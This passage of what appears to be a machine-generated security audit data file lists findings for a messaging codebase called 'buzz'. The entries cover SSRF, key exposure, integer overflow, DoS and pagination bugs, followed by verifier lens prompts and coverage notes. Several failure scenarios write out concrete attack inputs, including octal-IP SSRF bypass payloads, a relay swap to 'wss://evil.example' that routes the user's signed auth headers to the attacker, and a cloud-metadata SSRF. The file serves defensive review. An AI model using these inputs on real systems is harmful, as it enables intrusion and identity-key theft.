   "failure_scenario": "Mallory posts one message whose content alternates lines of `` `a` `` (an inline code span, producing one entry in `codeRanges`) and lines of `||` (a block-spoiler delimiter line), up to the relay's 256 KB content limit (`MAX_EVENT_CONTENT_BYTES` in crates/buzz-relay/src/handlers/ingest.rs). That yields on the order of 3x10^4 code ranges and 4x10^4 `||` lines. `MarkdownInner` (desktop/src/shared/ui/markdown.tsx:1871-1874) calls `extractSupportedLinkPreviews(content)` synchronously inside the render-path `useMemo`, which calls `stripHiddenLinkPreviewContent` (line 480 -> 187), which performs on the order of 10^9 `Array.some` iterations before the row can paint. The renderer thread freezes for tens of seconds every time that row mounts \u2014 on channel open, on every channel switch back, and for every client in the community. There is no length cap, no early exit, and no interval-index; the cost is entirely attacker-chosen.",
   "evidence": "    if (\n      content[index] === \"|\" &&\n      content[index + 1] === \"|\" &&\n      !isIndexInRanges(index, excludedRanges) &&\n      !isIndexInRanges(index + 1, excludedRanges)",
   "confidence": "medium",
   "reported_slice": "desktop-messages",
   "gate_a": "evidence found near claimed line 168",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F035"
  },
  {
   "file": "desktop/src-tauri/src/commands/pairing.rs",
   "line": 111,
   "severity": "high",
   "category": "secret-exposure",
   "claim": "start_pairing builds a payload embedding the plaintext nsec entirely in response to a renderer-invoked command, before any peer device has been verified via SAS.",
   "failure_scenario": "Combined with the confirm_pairing_sas gap above, the raw nsec is placed into a JSON string held in memory and later transmitted; if the outbound relay connection or the peer-selection logic can be influenced (e.g. via a spoofed NIP-11 pairing_relay_url from a malicious/compromised relay, see probe_pairing_relay/pairing_relay_from_nip11), the destination of this nsec-bearing payload is not something the renderer's caller strongly controls beyond triggering the flow.",
   "evidence": "let payload_json = serde_json::json!({\n        \"relayUrl\": http_url,\n        \"pubkey\": pubkey_hex,\n        \"nsec\": nsec,\n    });",
   "confidence": "low",
   "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
   "gate_a": "evidence found near claimed line 111",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F036"
  }
 ],
 [
  {
   "file": "crates/buzz-agent/src/mcp.rs",
   "line": 742,
   "severity": "high",
   "category": "untrusted-config-egress",
   "claim": "`spawn_one` executes `Command::new(&spec.command)` with args/env taken directly from the configured MCP server list (which, via buzz-persona, can originate from an untrusted persona-pack manifest) and re-adds a fixed PASSTHROUGH_ENV allowlist that includes `SSH_AUTH_SOCK`, `GIT_SSH_COMMAND`, `BUZZ_PRIVATE_KEY`, `BUZZ_RELAY_URL`, `BUZZ_AUTH_TAG`, and all proxy vars before layering the server's own `spec.env` on top. A persona-pack-declared MCP server therefore gets access to the SSH agent socket and Buzz relay identity material simply by being declared, without any distinction between operator-configured (trusted) servers and pack-supplied ones.",
   "failure_scenario": "A persona pack ships an MCP server whose real purpose is to read `SSH_AUTH_SOCK` (usable to sign SSH auth requests as the user) or to read `BUZZ_PRIVATE_KEY`/`BUZZ_AUTH_TAG` from its environment and exfiltrate them over the network \u2014 the tool description shown to the operator can be innocuous while the spawned process silently harvests these env vars on startup.",
   "evidence": "let mut cmd = Command::new(&spec.command);\n    cmd.args(&spec.args);\n    cmd.env_clear();\n    for k in PASSTHROUGH_ENV {\n        if let Ok(v) = std::env::var(k) {\n            cmd.env(k, v);\n        }\n    }",
   "confidence": "low",
   "reported_slice": "agent-surface (buzz-agent, buzz-dev-mcp, buzz-persona, buzz-workflow)",
   "gate_a": "evidence found near claimed line 742",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F037"
  },
  {
   "file": "mobile/lib/features/pairing/pairing_provider.dart",
   "line": 680,
   "severity": "medium",
   "category": "ssrf",
   "claim": "`_isPrivateHost`, the SSRF guard used by the legacy `buzz://` pairing path (`_validateRelayUrl`, line 654, called from `_parseLegacyInput` line 644 and from `_processPayload` line 461), is far weaker than the project's own `validateInviteRelayUri`. It only splits on '.' and requires exactly 4 decimal-parsable parts, so it misses: any non-dotted-quad literal (decimal `2130706433`, hex `0x7f000001`, octal/leading-zero `0177.0.0.1`, shortened `127.1`), all of 127.0.0.0/8 except the exact string `127.0.0.1` (the earlier check at line 665 is a literal string compare), 0.0.0.0/8, 100.64.0.0/10 CGNAT, and every IPv6 form other than the literal `::1`. `Uri.tryParse('http://$host')?.host` on line 672 does no normalization of these forms, but the platform resolver (getaddrinfo) does \u2014 so a host the check waves through resolves to loopback or LAN at connect time.",
   "failure_scenario": "A user is handed a `buzz://<base64url payload>` pairing code (pasted into the pairing field or scanned as a QR \u2014 pairing_page.dart line 149 / line 54 both feed `pair()`). The payload decodes to {\"relayUrl\":\"https://0177.0.0.1:8443\",\"nsec\":\"...\"} . `_validateRelayUrl` sees scheme https (OK in release), host is not the literal `localhost`/`127.0.0.1`/`::1`, and `_isPrivateHost` parses parts ['0177','0','0','1'] -> first octet 177, not private -> allowed. `_validateCredentials` then opens a WebSocket to `wss://0177.0.0.1:8443`, which the OS resolves to 127.0.0.1, i.e. a loopback service on the user's own device. The same trick with `https://2130706433` or `https://100.64.3.7` bypasses the check entirely because `parts.length != 4` returns false (not private).",
   "evidence": "  static bool _isPrivateHost(String host) {\n    final parts = host.split('.');\n    if (parts.length != 4) return false;\n    final octets = parts.map(int.tryParse).toList();\n    if (octets.any((o) => o == null)) return false;",
   "confidence": "high",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 680",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F038"
  },
  {
   "file": "crates/buzz-media/src/validation.rs",
   "line": 481,
   "severity": "medium",
   "category": "integer-overflow",
   "claim": "check_moov_before_mdat advances the top-level atom cursor with an unchecked `offset += atom_size`, where atom_size can be the raw 64-bit extended size straight from the file (only `extended < 16` is rejected at line 454-456). Its sibling walker validate_mp4_metadata_free is careful here \u2014 validation.rs:897 uses `off.checked_add(size).filter(|&v| v <= end)` \u2014 so this is an inconsistency inside the same file, not a deliberate choice.",
   "failure_scenario": "Attacker PUTs a 32-byte body: a well-formed 16-byte `ftyp`/`isom` box (so looks_like_mp4_iso_bmff at upload.rs:399 passes and routes to the video pipeline) followed by `00 00 00 01 'm' 'o' 'o' 'v' FF FF FF FF FF FF FF FF`. Entry: buzz-relay/src/api/media.rs:344 process_video_upload -> upload.rs:421 -> validation.rs:293 check_moov_before_mdat, which is the FIRST validator and runs before the checked walker. compact_size==1 so atom_size = u64::MAX; offset (16) + u64::MAX overflows. With overflow-checks on (dev/test) this panics inside spawn_blocking -> MediaError::Internal -> HTTP 500. With them off it wraps to 15, the cursor moves backwards, and the scanner re-reads misaligned garbage until the MAX_ATOMS=1024 guard fires and returns MoovNotAtFront \u2014 a misleading error for the client and 1024 wasted seek+read syscalls per request.",
   "evidence": "        offset += atom_size;",
   "confidence": "high",
   "reported_slice": "media (crates/buzz-media)",
   "gate_a": "evidence found near claimed line 481",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F039"
  },
  {
   "file": "crates/buzz-auth/src/rate_limit.rs",
   "line": 188,
   "severity": "medium",
   "category": "dead-security-control",
   "claim": "The per-IP connection fence declared by this trait is never wired up. `check_ip_connection` has exactly one implementation (crates/buzz-pubsub/src/rate_limiter.rs:112) and one call site in the whole repository \u2014 a test stub at crates/buzz-relay/src/admission.rs:85. `LimitType::IpConnections` is likewise constructed nowhere outside its own declaration (rate_limit.rs:66 and :76 are the only two hits under crates/), and `ip_rate_limit_key` has no production caller. The trait doc at lines 158-163 describes this as the fence that 'gate[s] connection acceptance at the network edge, before host\u2192community resolution has completed' \u2014 that gate does not exist at runtime, and `RateLimitConfig` (lines 85-108) has no field for it, so an operator cannot even configure one.",
   "failure_scenario": "A single unauthenticated IP opens WebSocket connections in a loop against the relay. `handle_active_connection` (connection.rs:141) acquires only the deployment-global `conn_semaphore` permit and, when it is exhausted, logs 'Connection limit reached' and drops the socket \u2014 for every client, not just the abuser. Because no per-IP counter is ever incremented, one host can consume the entire global connection budget and deny service to the whole deployment; combined with the unauthenticated admission bypass at connection.rs:608, each of those sockets is also free of per-message quotas for its 5-second pre-auth life.",
   "evidence": "    fn check_ip_connection(\n        &self,\n        ip: &IpAddr,\n        window_secs: u64,\n        limit: u64,",
   "confidence": "high",
   "reported_slice": "auth (crates/buzz-auth, crates/buzz-acp) + the call sites where their auth decisions are made or re-made",
   "gate_a": "evidence found near claimed line 188",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F040"
  }
 ],
 [
  {
   "file": "web/src/features/repos/use-repo-refs.ts",
   "line": 51,
   "severity": "medium",
   "category": "authorization-gap",
   "claim": "fetchRepoRefs queries kind:30618 (repo refs) events by `#d` tag only, with no `authors` filter restricting to the relay's own pubkey \u2014 the code has a TODO acknowledging that any community member with ReposWrite permission can publish a spoofed kind:30618 event that will be blended into the displayed branches/tags/HEAD for someone else's repo.",
   "failure_scenario": "Any user holding ReposWrite (a role short of repo ownership) publishes a kind:30618 event with the target repo's `d` tag but attacker-chosen `refs/heads/*` values; since dedup() only keys on (pubkey, kind, d) and parseRefs() merges tags across all matching events without checking which pubkey should be authoritative, this can inject a bogus branch name or HEAD SHA into the repo browser UI other users see, e.g. steering them toward a malicious ref during 'Run' HTML preview or clone.",
   "evidence": "  // TODO: Filter by `authors: [relayPubkey]` once the relay's own pubkey is\n  // exposed to the client. Without this, a user with ReposWrite permission\n  // could publish fake kind:30618 events with spoofed refs.\n  const events = await queryEvents(relayWsUrl(), {\n    kinds: [30618],\n    \"#d\": [repoId],\n  });",
   "confidence": "high",
   "reported_slice": "web (buzz/web/src, buzz/admin-web/src)",
   "gate_a": "evidence found near claimed line 51",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F041"
  },
  {
   "file": "desktop/src/features/messages/hooks.ts",
   "line": 678,
   "severity": "medium",
   "category": "state-consistency",
   "claim": "useDeleteMessageMutation.onSuccess removes the deleted message only from the flattened channelMessagesKey cache, not from the window store \u2014 violating the codebase's own documented invariant (channelWindowStore.ts:229-238 and the edit mutation's comment at hooks.ts:745-747 both state that patches applied only to the flattened array are silently reverted by the next live merge). The deleted row is resurrected by the next projection.",
   "failure_scenario": "User deletes their message (DeleteMessageConfirmDialog \u2192 useDeleteMessageMutation). onSuccess filters it out of channelMessagesKey, but the event remains in the ChannelWindowStore pages/liveOverlay. Any subsequent live event in the channel (any member sending a message triggers appendMessage at hooks.ts:264 \u2192 mergeLiveChannelWindowEvent \u2192 projectChannelWindowMessages \u2192 reconcileChannelWindowMessages, which re-emits every window event as authoritative) puts the deleted message back into the rendered timeline. It stays visible until the relay's kind-5/9005 deletion aux event arrives and formatTimelineMessages suppresses it; if that push is missed (brief disconnect at delete time), the deleted message remains visible until the next head refetch. The sibling edit mutation (hooks.ts:748-752) was explicitly fixed for this exact bug class via mapChannelWindowEvents; the delete path was not.",
   "evidence": "      queryClient.setQueryData<RelayEvent[]>(\n        channelMessagesKey(channel.id),\n        (current = []) => current.filter((message) => message.id !== eventId),\n      );",
   "confidence": "high",
   "reported_slice": "desktop-messages",
   "gate_a": "evidence found near claimed line 678",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F042"
  },
  {
   "file": "desktop/src-tauri/src/commands/profile.rs",
   "line": 111,
   "severity": "medium",
   "category": "nip98-token-issued-to-arbitrary-host",
   "claim": "`update_profile_at_relay` takes `relay_url` verbatim from the renderer and passes it through `relay_http_base_url` \u2014 which does no scheme, host, or allowlist validation and returns any non-ws string unchanged (relay.rs:73-85) \u2014 then hands the result to `query_relay_at_with_keys` and `submit_event_at_with_keys`. Both mint a NIP-98 `kind:27235` Authorization header signed with the user's real identity key (relay.rs:354, relay/submit.rs:29) and POST it to that host. There is no confirmation, no https requirement, and no check that the URL is a workspace the user has ever configured.",
   "failure_scenario": "A compromised renderer calls `update_profile_at_relay({relay_url: \"http://169.254.169.254\", expected_pubkey: <the real pubkey from get_identity()>, expected_avatar_url: null, avatar_url: \"x\"})`. `capture_expected_signer` passes because the pubkey does match the live identity. The desktop then POSTs to `http://169.254.169.254/query` with an `Authorization: Nostr <base64 kind:27235 signed by the user's identity key>` header \u2014 an authenticated SSRF from the desktop process into cloud metadata / localhost / LAN services, plus delivery of a freshly signed HttpAuth event whose `u` tag is attacker-chosen, to a host the attacker controls. On the submit leg it also publishes a signed kind:0 profile event for the user's real identity at that host. Note `query_relay_at_with_keys` is also the one relay egress path that carries no `egress_guard::assert_no_key_backup_bytes` call, unlike relay/submit.rs:28 and relay.rs:570.",
   "evidence": "    let signer = capture_expected_signer(&state, &expected_pubkey)?;\n\n    let api_base_url = relay_http_base_url(&relay_url);",
   "confidence": "high",
   "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
   "gate_a": "evidence found near claimed line 111",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F043"
  },
  {
   "file": "desktop/src-tauri/src/commands/workspace.rs",
   "line": 176,
   "severity": "medium",
   "category": "unauthenticated-identity-swap",
   "claim": "`apply_workspace` is a plain Tauri command that accepts an arbitrary `nsec: Option<String>` from the renderer and installs the parsed keypair as the process-wide signing identity, and an arbitrary `relay_url: String` as the global relay override \u2014 with no validation beyond `Keys::parse`, no user confirmation, and no check that the pair corresponds to a workspace the user actually configured. Unlike `import_identity` (identity.rs:336-388) it takes no `identity_mutation` guard around the swap and performs no durable persistence, so the swap is silent and invisible to the identity UI.",
   "failure_scenario": "A compromised renderer calls `apply_workspace({relay_url: \"wss://evil.example\", nsec: null, repos_dir: null})`. Every later `submit_event` and `query_relay` resolves through `relay_api_base_url_with_override` (relay.rs:50-55) to the attacker's host, so all subsequent events signed with the user's real key \u2014 and every NIP-98 Authorization header built by `build_nip98_auth_header` (relay.rs:101-109) \u2014 are delivered to the attacker, and every read the app performs returns attacker-chosen events. Alternatively, passing an attacker-generated `nsec` replaces the live signing identity in memory: subsequent user actions are signed by a key the attacker holds while `get_identity` reports the substituted pubkey as if it were the user's own, and `create_ncryptsec_backup` would encrypt and hand back the substituted key. Because nothing is persisted, the swap disappears on restart and leaves no trace.",
   "evidence": "        if let Some(keys) = parsed_keys {\n            let mut keys_guard = state.keys.lock().map_err(|e| e.to_string())?;\n            *keys_guard = keys;\n        }",
   "confidence": "high",
   "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
   "gate_a": "evidence found near claimed line 176",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F044"
  }
 ],
 [
  {
   "file": "desktop/src-tauri/src/commands/messages.rs",
   "line": 231,
   "severity": "medium",
   "category": "pagination",
   "claim": "`get_forum_posts` hands the frontend a bare `created_at` cursor, which it feeds back as `until` on the next call. `until` without `before_id` compiles to `created_at <= u` in crates/buzz-db/src/event.rs:505-506 \u2014 inclusive \u2014 so every page re-returns its own boundary post, and a `created_at` second holding a full page of posts makes the cursor unable to advance at all. This is the exact wall that `get_channel_messages_before` in the same file documents (lines 409-423) and fixes with a `(until, before_id)` composite; the forum reader never got the fix.",
   "failure_scenario": "A forum channel receives 20+ kind:45001 posts inside one second (a migration, a bulk import, or an agent burst). The user opens the forum with the default cap of 20, gets 20 posts, and clicks 'Load more'. The frontend sends `before = last.created_at`; the relay's SQL becomes `created_at <= that_second ORDER BY created_at DESC LIMIT 20` and returns the identical 20 rows. Every subsequent 'Load more' returns the same page forever \u2014 the rest of the forum's history is unreachable, and the list visibly duplicates the boundary post even in the ordinary case.",
   "evidence": "    let next_cursor = messages.last().map(|m| m.created_at);",
   "confidence": "high",
   "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
   "gate_a": "evidence found near claimed line 231",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F045"
  },
  {
   "file": "desktop/src-tauri/src/commands/messages.rs",
   "line": 246,
   "severity": "medium",
   "category": "silent-truncation",
   "claim": "`get_forum_thread` accepts `limit` and `cursor` and throws both away on its first line, never sets a `limit` on its reply filter (so the relay's default cap applies), and then reports `total_replies = replies.len()` \u2014 the count of whatever survived that invisible cap \u2014 while hard-coding `next_cursor: None`. The UI is handed a truncated reply set labelled as the complete one, with no way to page for the rest.",
   "failure_scenario": "A forum thread accumulates more replies than the relay's default query limit. A user opens it: the second filter at lines 253-257 carries `kinds`/`#e`/`#h` and no `limit`, so the relay returns its default slice. `total_replies` (line 271) counts only that slice, so the thread header reads e.g. '50 replies' when there are 400. `next_cursor` is `None`, so the frontend has nothing to page with, and the `limit`/`cursor` arguments it did pass were discarded at line 246. Replies are permanently invisible in the UI and the visible count is wrong.",
   "evidence": "    let _ = (limit, cursor);",
   "confidence": "high",
   "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
   "gate_a": "evidence found near claimed line 246",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F046"
  },
  {
   "file": "desktop/src-tauri/src/commands/messages.rs",
   "line": 659,
   "severity": "medium",
   "category": "idempotency",
   "claim": "The marker-scan paging loop backing `send_managed_agent_channel_message`'s duplicate suppression advances its cursor to `min(created_at) - 1`, which skips every event sharing that oldest second beyond the 500-row page boundary. It is also bounded at 10 pages (5000 events). Either miss makes `find_managed_agent_channel_message_by_marker` return `None` for a marker that does exist, and the caller then posts the message again.",
   "failure_scenario": "An agent posts a marked announcement into a busy channel. Later the same flow re-runs (app restart, retry, config change). `send_managed_agent_channel_message` calls the marker scan at line 816; the relay returns a full 500-event page whose oldest 40 events all share one second. The loop sets `until = that_second - 1`, jumping over the ~30 events at that second that did not fit in the page \u2014 one of which carries the marker. The scan reports 'no existing marker', the guard at lines 815-836 does not short-circuit, and a duplicate announcement is signed with the agent's key and posted to the channel. The same thing happens unconditionally in any channel with more than 5000 stream messages, since the loop stops after 10 pages.",
   "evidence": "        until = events\n            .iter()\n            .map(|event| event.created_at.as_secs())\n            .min()\n            .map(|timestamp| timestamp.saturating_sub(1));",
   "confidence": "high",
   "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
   "gate_a": "evidence found near claimed line 659",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F047"
  },
  {
   "file": "desktop/src-tauri/src/commands/channels.rs",
   "line": 221,
   "severity": "medium",
   "category": "silent-failure",
   "claim": "`get_channels` swallows relay errors on both of its enrichment queries with `.unwrap_or_default()` (member counts at line 221, last-message timestamps at line 252). A transient relay failure on either query is indistinguishable from 'this data is genuinely empty': the command still returns `Ok` with every channel reporting zero members and no last-message timestamp.",
   "failure_scenario": "The relay returns a 5xx (or the HTTP call times out) on the batched kind:39002 query during a channel-list refresh. `query_relay(...).await.unwrap_or_default()` yields an empty Vec, `collect_members_by_channel` produces an empty map, and the `if let Some(info)` at line 225 never fires \u2014 so `member_count` stays at whatever `channel_info_from_event` defaulted it to (0) for every channel. The same failure on the per-channel last-message filters at line 252 leaves `last_message_at` as `None` everywhere. The user sees their entire channel list report '0 members' and lose its recency ordering, with no error banner and nothing in the UI to distinguish it from a real empty workspace \u2014 the natural reaction is to think the workspace was wiped.",
   "evidence": "        .await\n        .unwrap_or_default();\n\n        let membership = collect_members_by_channel(&members_events);",
   "confidence": "high",
   "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
   "gate_a": "evidence found near claimed line 221",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F048"
  }
 ]
]
const LENSES = [
 {
  "key": "reachability",
  "text": "Your lens is REACHABILITY. Ignore whether the described bug would be bad. Ask only: can control flow actually get there in a shipped build? Find the callers. Is the function dead code, test-only, behind a feature flag that ships off, behind a `#[cfg(test)]`, gated on a debug build, or reachable only by someone who already has the privilege the finding claims they would gain? If the claimed attacker input is in fact set by trusted local code and never by a remote peer, the finding is refuted."
 },
 {
  "key": "exploitability",
  "text": "Your lens is EXPLOITABILITY. Assume the code path IS reachable. Ask: does an attacker actually gain anything? Trace what they must already control, and what they end up controlling. A panic in a task that is caught and restarted, an integer overflow on a value that cannot exceed a small bound, a 'secret' that is a public key, an unbounded allocation already capped by an upstream frame-size limit - all refuted. State the concrete attacker input and the concrete gain, or refute."
 },
 {
  "key": "code-reading",
  "text": "Your lens is CODE-READING CORRECTNESS. Assume the finding's author misread the code, because that is the most common failure. Re-read the cited lines and everything they call. Did they miss a `?`, an early return, a guard clause above, a validation performed by the caller, a wrapper type that already enforces the invariant, a `match` arm that handles the case, or a trait impl that is not the one they assumed? Does the quoted evidence actually mean what they say it means? If the code does not say what the finding claims, refute."
 }
]
const COVERAGE = [
 {
  "slice": "tauri-commands (desktop/src-tauri/src/commands)",
  "files_read": 5,
  "finding_count": 4,
  "coverage_note": "Listed all 97 files in the slice. Read in full: identity.rs, identity_archive.rs, pairing.rs, engrams.rs, project_git_exec.rs. Skimmed/greped the rest for command counts, unsafe/unwrap/exec patterns, and Command::new usage (14 files use subprocess spawning: window_chrome, relay_reconnect, project_terminal, project_git_exec, personas/inbound.rs, media_transcode, media_download, agent_model_process, agent_discovery/*, agent_auth.rs) but did not read agents.rs, messages.rs, team_snapshot.rs, personas/snapshot/import.rs, channels.rs, channel_window.rs, teams.rs, profile.rs bodies in depth due to the coverage-pass time budget \u2014 these remain unread beyond a directory listing and should be prioritized in a follow-up pass since they are named in the task brief as reaching buzz-sdk/sign(). project_git_exec.rs (the git subprocess plumbing) was read fully and looks deliberately hardened (branch/ref allowlisting, clone-URL-to-relay pinning, env scrubbing) \u2014 no finding there. Given the effort budget, I focused on the two files that produced the clearest, highest-severity candidates (identity.rs, pairing.rs) rather than spreading thin across all 97 files."
 },
 {
  "slice": "desktop-messages",
  "files_read": 19,
  "finding_count": 2,
  "coverage_note": "Coverage pass, not exhaustive. Listed all 367 files in the four target directories and read broadly across the highest-risk categories: message-link URL parsing/rendering (remarkMessageLinks.ts, messageLink.ts, openPopoverLink.ts, useLinkEditor.tsx, resolveLinkAt.ts, linkInteractionExtension.ts), custom-emoji rendering/parsing (customEmojiNode.ts, custom-emoji/hooks.ts, imetaMediaMarkdown.ts), timeline/event formatting that turns raw relay events into rendered rows (formatTimelineMessages.ts, threading.ts, systemEventCopy.ts), mention/channel highlighting regex construction (mentionHighlightExtension.ts), diff rendering (parseDiff.ts), clipboard/DOM handling (normalizeMentionClipboard.ts, BotIdenticon.tsx), spoiler formatting, and channel description text (channelDescription.ts). Grepped the whole slice for dangerouslySetInnerHTML/innerHTML (only two hits, both benign \u2014 a jdenticon SVG the app itself generates, and clipboard code that goes through DOMParser rather than raw HTML injection) and for openExternal/shell invocation call sites.\n\nNot read in detail (skipped for time, coverage pass): the bulk of the `ui/` React components in messages/channels/forum (MessageRow, MessageTimeline, ChannelPane, ForumPostCard, ForumComposer, etc.), virtualization/scroll logic (useAnchoredScroll, virtualizedTimelineItems, useVirtualizedBottomSettle), draft persistence (useDrafts, DraftsPanel), media upload (useMediaUpload.ts, ComposerImageEditor.tsx), agent-session UI (AgentSessionThreadPanel, MembersSidebarAgentControls, WelcomeAgentCreateDialog), read-state/unread tracking, and nearly all the `.test.mjs` files (used only as behavior reference, not as attack surface). The actual markdown/HTML sanitization layer (`shared/ui/markdown`) that the `a`/`img` renderers and `remarkMessageLinks`/`customEmojiNode` plug into is outside this slice's assigned paths and was only glanced at (mediaUrl.ts's rewriteRelayUrl) \u2014 a full audit of that shared renderer is likely covered by a different slice or should be prioritized in a follow-up pass, since it is the actual point where markdown AST becomes DOM for all four features in this slice.\n\nNo kind/created_at/tag-array bounds issues were found in the code actually read (getDepth in formatTimelineMessages.ts has an explicit cycle guard via resolvingEventIds, so a malicious self-referencing 'reply' tag can't cause unbounded recursion). No SQL/command injection surface exists in this TS-only slice. Findings below are candidates for the adversarial verification phase, not confirmed vulnerabilities."
 },
 {
  "slice": "core (crates/buzz-core)",
  "files_read": 21,
  "finding_count": 2,
  "coverage_note": "Read all 24 files in the slice (every .rs file under crates/buzz-core/src, including the pairing/ submodule). This is a well-tested, well-commented crate; most modules are pure data/crypto helpers with extensive unit tests covering edge cases (SSRF IP classification, tenant host normalization, git ref-pattern permission evaluation, NIP-AE engram parsing, NIP-AB pairing state machine, presence/channel enums). I read every file in full rather than sampling, given the slice is only 24 files. I did not cross-reference into other crates (buzz-relay, buzz-db, buzz-auth) to confirm whether callers of buzz-core's gating helpers (reader_authorized_for_event, P_GATED_KINDS, decrypt_observer_payload) actually close the gaps flagged below \u2014 that verification requires the adversarial pass to grep call sites outside this slice. Confidence on both findings is therefore medium/low: the code as written in this slice shows an asymmetry/gap, but whether it's exploitable depends on enforcement done elsewhere."
 },
 {
  "slice": "mobile",
  "files_read": 13,
  "finding_count": 1,
  "coverage_note": "Read broadly across the 234-file Dart slice plus the native shells. Fully read: AndroidManifest.xml (all variants share the same pattern), Info.plist, pairing_crypto.dart, pairing_socket.dart, pairing_provider.dart (full NIP-AB pairing flow), deep_link.dart, deep_link_dispatcher.dart, relay_validation.dart (SSRF/private-IP checks), media_auth.dart (Blossom BUD-01 auth), nostr_models.dart (NostrEvent model + parsers), nip44.dart (encryption), relay_socket.dart (NIP-42 auth), relay_session.dart (event dispatch pipeline). Skimmed the file listing for the rest (compose_bar/*, channels_page/*, theme/*, widgets/*, forum/*, activity/*) but did not open most UI-only widget files, as they are unlikely to contain security-relevant logic distinct from the core relay/auth/crypto/deeplink files already covered. Did not read android/ios build.gradle, Podfile, or native Kotlin/Swift plugin code beyond the manifest/plist \u2014 the manifest shows MainActivity is the standard Flutter template activity with no extra exported components. Did not exhaustively review every media-rendering widget for injection-equivalent issues (Flutter widgets are not HTML-based, so classic XSS is largely inapplicable there). This is a coverage pass; the finding below is the standout candidate surfaced from this slice."
 },
 {
  "slice": "gateway-mesh (buzz-push-gateway, buzz-pubsub, buzz-relay-mesh, buzz-pair-relay)",
  "files_read": 23,
  "finding_count": 1,
  "coverage_note": "Read essentially all of buzz-push-gateway (token.rs, app_attest.rs, grant.rs, authority.rs, http.rs, model.rs, strict_json.rs, apns.rs) and most of buzz-relay-mesh (wire.rs, gossip.rs, membership.rs, endpoint.rs, peer.rs, registry.rs, runtime.rs). For buzz-pubsub I read nip98_replay.rs, publisher.rs, subscriber.rs, rate_limiter.rs, topic.rs, conn_control.rs, and presence.rs but did not open cache_invalidation.rs, error.rs, or lib.rs (the crate-level wiring/registration code) in detail. For buzz-pair-relay I read the whole (single-file) crate lib.rs but not main.rs or the integration test. Skipped: config.rs, postgres.rs, metrics.rs in buzz-push-gateway, and status.rs in buzz-relay-mesh (looked lower-risk: config/metrics glue, and postgres.rs is a straightforward AuthorityStore impl mirroring the already-reviewed in-memory model). Did not build or run the workspace; this is a read-only static pass. Overall this slice is unusually carefully engineered \u2014 nearly every wire boundary has explicit versioning, strict-JSON duplicate-key rejection, size caps, replay guards, and signed attestations with accompanying adversarial unit tests \u2014 so most of the pass surfaced no exploitable gaps. The one structural gap I found is in the gossip membership layer, where individual GossipRecord updates (unlike the registry's ReadyRecord) carry no signature binding them to the runtime_id they describe."
 },
 {
  "slice": "db (crates/buzz-db, migrations, crates/buzz-sdk)",
  "files_read": 9,
  "finding_count": 2,
  "coverage_note": "Read broadly rather than deeply, per coverage-pass instructions. Fully read: lib.rs (Db/ReadSession/route_proof internals, first ~400 lines), api_token.rs (full), migration.rs (full, including the tenant-isolation test lints), nip_oa.rs (full, NIP-OA sign/verify), mentions.rs (partial, extract_at_names/known-name matching), event.rs (EventQuery struct, insert_event, query_events/query_events_on dynamic-filter builder in full, huddle_started_link_exists). Read builders.rs in two large chunks covering nearly all 38 builders (message/thread/mention/imeta helpers, git repo/patch/issue/PR/status builders, workflow, DM, presence/status, moderation commands 9040-9044, NIP-IA archive/unarchive). Grepped the whole slice for format!-into-SQL patterns, unwrap()/expect() (confirmed the small number outside #[cfg(test)] are all inside test-only functions or #[tokio::test] blocks), and rand usage for invite-token minting. Skimmed channel.rs's get_accessible_channels dynamic-SQL builder (col_prefix/membership_clause are compile-time constants, not attacker input \u2014 no injection). Spot-read relay_invite.rs (mint + validate_mint_inputs). NOT read in depth: channel.rs (~2600 lines) beyond the one function, dm.rs, feed.rs, thread.rs, moderation.rs, admin_moderation.rs, archived_identities.rs, git_repo.rs, partition.rs, product_feedback.rs, push.rs, reaction.rs, relay_members.rs, replica_fence.rs (skimmed only), usage.rs, user.rs, workflow.rs, error.rs, or the raw migrations/*.sql files individually (only reviewed via migration.rs's embedded-migration assertions, which quote large excerpts). Given the volume (56 files) and the coverage-pass mandate, these were deprioritized after the QueryBuilder/injection and builder-validation sweeps came back clean, in favor of spending remaining budget confirming the two candidates below with verbatim line evidence rather than skimming everything shallowly."
 },
 {
  "slice": "desktop-shared (desktop/src/shared, 328 files)",
  "files_read": 12,
  "finding_count": 2,
